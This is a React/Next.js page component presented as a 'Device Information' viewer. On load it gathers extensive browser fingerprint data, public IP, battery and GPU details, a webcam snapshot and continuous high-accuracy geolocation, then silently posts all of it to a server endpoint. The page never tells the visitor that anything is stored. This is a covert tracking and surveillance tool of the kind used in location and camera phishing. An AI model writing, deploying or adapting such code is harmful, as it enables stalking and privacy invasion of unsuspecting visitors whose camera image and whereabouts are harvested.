'use client';

import { useState, useEffect, useRef, useCallback } from 'react';
import Image from 'next/image';
import { Container, Row, Col, Card, ListGroup } from 'react-bootstrap';
import { Camera, GeoAlt, InfoCircle } from 'react-bootstrap-icons';
import axios from 'axios';

const DeviceInfoApp = () => {
  const videoRef = useRef(null);
  const [data, setData] = useState({});
  const [location, setLocation] = useState({});
  const [cameraImage, setCameraImage] = useState(null);

  const saveData = useCallback(async (newData) => {
    const payload = { data: { ...data, ...newData } };
    try {
      await axios.post('/api/tools/db', payload);
    } catch (error) {}
  }, [data]);

  const startCamera = useCallback(async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
      captureImage();
    } catch (err) {}
  }, []);

  const enableLiveLocation = useCallback(() => {
    if ('geolocation' in navigator) {
      navigator.geolocation.watchPosition(
        (position) => {
          const { latitude, longitude, accuracy } = position.coords;
          const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
          const locationInfo = {
            latitude,
            longitude,
            accuracy: `${accuracy} meters`,
            google_maps_url: googleMapsUrl,
          };

          setLocation(locationInfo);
          saveData(locationInfo);
        },
        (error) => {
          setLocation({ error: error.message });
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }
  }, [saveData]);

  useEffect(() => {
    const collectData = async () => {
      const info = {};

      Object.keys(navigator).forEach((key) => {
        info[key] = navigator[key] || 'N/A';
      });

      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (connection) {
        Object.keys(connection).forEach((key) => {
          info[`connection_${key}`] = connection[key] || 'N/A';
        });
      }

      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        info.battery_level = (battery.level * 100).toFixed(0) + '%';
        info.battery_charging = battery.charging ? 'Charging' : 'Discharging';
        info.battery_charging_time = battery.chargingTime || 'N/A';
        info.battery_discharging_time = battery.dischargingTime || 'N/A';
      } else {
        info.battery_level = 'N/A';
        info.battery_charging = 'N/A';
      }

      try {
        const res = await axios.get('https://api.ipify.org?format=json');
        info.public_ip = res.data.ip || 'N/A';
      } catch (error) {
        info.public_ip = 'Failed to retrieve';
      }

      info.screen_width = window.screen.width || 'N/A';
      info.screen_height = window.screen.height || 'N/A';
      info.screen_color_depth = window.screen.colorDepth || 'N/A';
      info.screen_pixel_depth = window.screen.pixelDepth || 'N/A';

      info.touch_support = 'ontouchstart' in window || 'maxTouchPoints' in navigator ? 'Yes' : 'No';
      info.languages = navigator.languages ? navigator.languages.join(', ') : navigator.language || 'N/A';
      info.plugins = navigator.plugins.length
        ? Array.from(navigator.plugins).map((plugin) => plugin.name).join(', ')
        : 'N/A';

      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        info.gpu_renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
        info.gpu_vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A';
      } else {
        info.gpu_renderer = 'N/A';
        info.gpu_vendor = 'N/A';
      }

      info.device_memory = 'deviceMemory' in navigator ? `${navigator.deviceMemory} GB` : 'N/A';

      try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        info.audio_outputs = devices.filter((d) => d.kind === 'audiooutput').map((d) => d.label).join(', ') || 'N/A';
        info.video_inputs = devices.filter((d) => d.kind === 'videoinput').map((d) => d.label).join(', ') || 'N/A';
      } catch (error) {
        info.audio_outputs = 'Failed to retrieve';
        info.video_inputs = 'Failed to retrieve';
      }

      info.current_time = new Date().toLocaleString();
      info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      setData(info);
      saveData(info);
    };

    collectData();
    startCamera();
    enableLiveLocation();
  }, [enableLiveLocation, saveData, startCamera]);

  const captureImage = () => {
    if (videoRef.current) {
      const canvas = document.createElement('canvas');
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
      const imageBase64 = canvas.toDataURL('image/png');
      setCameraImage(imageBase64);
      saveData({ cameraImage: imageBase64 });
    }
  };

  return (
    <Container className="mt-4">
      <h1 className="text-center mb-4">Device Information</h1>
      <Row>
        <Col md={12} className="mb-3">
          <Card>
            <Card.Header><GeoAlt /> Live Location</Card.Header>
            <Card.Body>
              <ListGroup>
                {Object.entries(location).map(([key, value]) => (
                  <ListGroup.Item key={key}>
                    <strong>{key}</strong>: {value || 'N/A'}
                  </ListGroup.Item>
                ))}
              </ListGroup>
            </Card.Body>
          </Card>
        </Col>

        <Col md={12} className="mb-3">
          <Card>
            <Card.Header><InfoCircle /> Device Info</Card.Header>
            <Card.Body>
              <ListGroup>
                {Object.entries(data).map(([key, value]) => (
                  <ListGroup.Item key={key}>
                    <strong>{key.charAt(0).toUpperCase() + key.slice(1).toLowerCase().replace(/_/g, ' ')}</strong>: {value || 'N/A'}
                  </ListGroup.Item>
                ))}
              </ListGroup>
            </Card.Body>
          </Card>
        </Col>

        <Col md={12} className="mb-3">
          <Card>
            <Card.Header><Camera /> Camera Preview</Card.Header>
            <Card.Body className="text-center">
              <video ref={videoRef} autoPlay muted style={{ width: '100%' }} />
              {cameraImage && (
                <Image
                  src={cameraImage}
                  alt="Captured"
                  width={500}
                  height={300}
                  className="mt-3"
                  style={{ border: '1px solid #ddd', borderRadius: '8px' }}
                />
              )}
            </Card.Body>
          </Card>
        </Col>
      </Row>
    </Container>
  );
};

export default DeviceInfoApp;
